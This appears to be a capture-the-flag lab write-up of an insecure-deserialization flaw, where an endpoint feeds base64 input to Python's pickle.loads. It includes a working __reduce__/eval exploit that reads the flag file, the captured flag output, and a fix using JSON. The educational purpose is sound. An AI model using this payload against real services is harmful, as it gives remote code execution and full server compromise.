# A08:2021 - Software and Data Integrity Failures (Insecure Deserialization)

**Endpoint:** `POST /a08/profile/import`
**Severity:** Critical

## Vulnerability

The "import profile backup" feature base64-decodes the request body and
feeds it straight into `pickle.loads`:

```python
# app/challenges/a08_deserialize.py
raw = base64.b64decode(data)
restored = pickle.loads(raw)
```

`pickle` is not a data format, it's a bytecode-ish instruction stream for
reconstructing Python objects — deserializing it can call arbitrary
callables via `__reduce__`. There is no sanitization that makes
`pickle.loads` on untrusted input safe; the fix is to not do it.

## Reproduce

```python
import base64, pickle, requests

class Exploit:
    def __reduce__(self):
        return (eval, ("open('flag_a08.txt').read()",))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
r = requests.post("http://localhost:5000/a08/profile/import", json={"data": payload})
print(r.json())
```

```json
{"restored": "FLAG{insecure_pickle_deserialization}\n"}
```

`__reduce__` tells pickle "to rebuild this object, call `eval(...)`" — that
call happens during `pickle.loads`, before the app ever inspects the
"restored" value. In a real attack this would run `os.system`,
`subprocess.Popen`, or open a reverse shell instead of just reading a file.

## Impact

Remote code execution as the application user, triggered by a single POST
with attacker-controlled bytes. Full server compromise.

## Fix

Don't unpickle untrusted input, ever. Use a data-only format instead:

```python
import json
restored = json.loads(base64.b64decode(data))
```

If a more expressive format than JSON is genuinely needed, use one with no
executable-object model (e.g. `msgpack`, or JSON with an explicit,
allowlisted schema) — never `pickle`, `yaml.load` (without
`SafeLoader`), or similar.

## Reference

[OWASP Top 10 2021 - A08 Software and Data Integrity Failures](https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/)
